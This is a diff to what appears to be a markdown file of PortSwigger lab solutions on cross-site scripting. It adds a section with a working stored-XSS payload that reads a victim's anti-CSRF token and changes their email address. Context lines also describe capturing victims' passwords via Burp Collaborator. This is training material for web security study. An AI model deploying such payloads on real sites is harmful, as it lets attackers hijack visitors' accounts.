@@ -16,6 +16,7 @@
 - [Stored DOM XSS](#stored-dom-xss)
 - [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
 - [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
+- [Exploiting XSS to perform CSRF](#exploiting-xss-to-perform-csrf)
 
 ## Reflected XSS into HTML context with nothing encoded
 Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
@@ -215,3 +216,34 @@ This script will make anyone who views the comment issue a POST request to burpc
 4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction.If you don't see any interactions listed, wait a few seconds and try again.
 5. Take a note of the value of the victim's username and password in the POST body.
 6. Use the credentials to log in as the victim user.
+
+## Exploiting XSS to perform CSRF
+Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
+
+<!-- omit in toc -->
+### Quick Solution
+As stated in the description of the lab there is an XSS vulnerability in the comments section. This vulnerability can be leveraged to perform a CSRF attack and change the email address of the victim. Payload in the next section.
+
+<!-- omit in toc -->
+### Solution
+1. Log in using the credentials provided. On your user account page, notice the function for updating your email address.
+2. If you view the source for the page, you'll see the following information:
+ - You need to issue a POST request to ``/my-account/change-email``, with a parameter called ``email``.
+ - There's an anti-CSRF token in a hidden input called token.
+This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
+3. Submit the following payload in a blog comment:
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+This will make anyone who views the comment issue a POST request to change their email address to ``test@test.com``.
